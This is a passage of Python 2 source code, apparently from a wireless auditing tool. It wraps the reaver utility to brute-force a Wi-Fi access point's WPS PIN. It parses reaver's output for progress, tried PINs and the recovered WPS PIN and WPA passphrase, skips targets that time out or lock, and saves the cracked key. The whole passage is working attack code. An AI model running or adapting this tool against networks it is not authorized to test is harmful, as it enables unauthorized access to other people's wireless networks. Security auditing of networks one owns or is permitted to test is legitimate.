		   '-b', target.bssid,
		   '-o', self.temp + 'out.out', # Dump output to file to be monitored
		   '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
		   '-c', target.channel,
		   # '--ignore-locks',
		   '-vv']  # verbose output
		proc = Popen(cmd, stdout=self.DN, stderr=self.DN)

		cracked = False   # Flag for when password/pin is found
		percent = 'x.xx%' # Percentage complete
		aps     = 'x'     # Seconds per attempt
		time_started = time.time()
		last_success = time_started # Time of last successful attempt
		last_pin = ''     # Keep track of last pin tried (to detect retries)
		retries  = 0      # Number of times we have attempted this PIN
		tries_total = 0      # Number of times we have attempted all pins
		tries    = 0      # Number of successful attempts
		pin = ''
		key = ''

		try:
			while not cracked:
				time.sleep(1)

				if proc.poll() != None:
					# Process stopped: Cracked? Failed?
					inf = open(self.temp + 'out.out', 'r')
					lines = inf.read().split('\n')
					inf.close()
					for line in lines:
						# When it's cracked:
						if line.find("WPS PIN: '") != -1:
							pin = line[line.find("WPS PIN: '") + 10:-1]
						if line.find("WPA PSK: '") != -1:
							key = line[line.find("WPA PSK: '") + 10:-1]
							cracked = True
					break

				if not os.path.exists(self.temp + 'out.out'): continue

				inf = open(self.temp + 'out.out', 'r')
				lines = inf.read().split('\n')
				inf.close()

				for line in lines:
					if line.strip() == '': continue
					# Status
					if line.find(' complete @ ') != -1 and len(line) > 8:
						percent = line.split(' ')[1]
						i = line.find(' (')
						j = line.find(' seconds/', i)
						if i != -1 and j != -1: aps = line[i+2:j]
					# PIN attempt
					elif line.find(' Trying pin ') != -1:
						pin = line.strip().split(' ')[-1]
						if pin == last_pin:
							retries += 1
						elif tries_total == 0:
							last_pin = pin
							tries_total -= 1
						else:
							last_success = time.time()
							tries += 1
							last_pin = pin
							retries = 0
						tries_total += 1

					# Warning
					elif line.endswith('10 failed connections in a row'): pass

					# Check for PIN/PSK
					elif line.find("WPS PIN: '") != -1:
						pin = line[line.find("WPS PIN: '") + 10:-1]
					elif line.find("WPA PSK: '") != -1:
						key = line[line.find("WPA PSK: '") + 10:-1]
						cracked = True
					if cracked: break

				print ' %s WPS attack, %s success/ttl,' % \
									(self.GR+self.sec_to_hms(time.time()-time_started)+self.W, \
									self.G+str(tries)+self.W+'/'+self.O+str(tries_total)+self.W),

				if percent == 'x.xx%' and aps == 'x': print '\r',
				else:
					print '%s complete (%s sec/att)   \r' % (self.G+percent+self.W, self.G+aps+self.W),


				if self.WPS_TIMEOUT > 0 and (time.time() - last_success) > self.WPS_TIMEOUT:
					print self.R+'\n [!]'+self.O+' unable to complete successful try in %d seconds' % (self.WPS_TIMEOUT)
					print self.R+' [+]'+self.W+' skipping %s' % (self.O+target.ssid+self.W)
					break

				if self.WPS_MAX_RETRIES > 0 and retries > self.WPS_MAX_RETRIES:
					print self.R+'\n [!]'+self.O+' unable to complete successful try in %d retries' % (self.WPS_MAX_RETRIES)
					print self.R+' [+]'+self.O+' the access point may have WPS-locking enabled, or is too far away'+self.W
					print self.R+' [+]'+self.W+' skipping %s' % (self.O+target.ssid+self.W)
					break

				if self.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (float(tries) / tries_total) < self.WPS_RATIO_THRESHOLD:
					print self.R+'\n [!]'+self.O+' successful/total attempts ratio was too low (< %.2f)' % (self.WPS_RATIO_THRESHOLD)
					print self.R+' [+]'+self.W+' skipping %s' % (self.G+target.ssid+self.W)
					break

				stdout.flush()
				# Clear out output file if bigger than 1mb
				inf = open(self.temp + 'out.out', 'w')
				inf.close()

			# End of big "while not cracked" loop

			if cracked:
				if pin != '': print self.GR+'\n\n [+]'+self.G+' PIN found:     %s' % (self.C+pin+self.W)
				if key != '': print self.GR+' [+] %sWPA key found:%s %s' % (self.G, self.W, self.C+key+self.W)
				self.WPA_FINDINGS.append(self.W+"found %s's WPA key: \"%s\", WPS PIN: %s" %
										 (self.G+target.ssid+self.W, self.C+key+self.W, self.C+pin+self.W))
				self.WPA_FINDINGS.append('')

				self.save_cracked(target.bssid, target.ssid, "Key is '" + key + "' and PIN is '" + pin + "'", 'WPA')

		except KeyboardInterrupt:
			print self.R+'\n (^C)'+self.O+' WPS brute-force attack interrupted'+self.W
			if self.attack_interrupted_prompt():
				self.send_interrupt(proc)
				print ''
				self.exit_gracefully(0)

		self.send_interrupt(proc)

		return cracked

#if __name__ == '__main__':
#	try:
#		banner()
#		main()
#	except KeyboardInterrupt: print R+'\n (^C)'+self.O+' interrupted\n'+self.W
#	except EOFError:          print R+'\n (^D)'+self.O+' interrupted\n'+self.W
#	exit_gracefully(0)




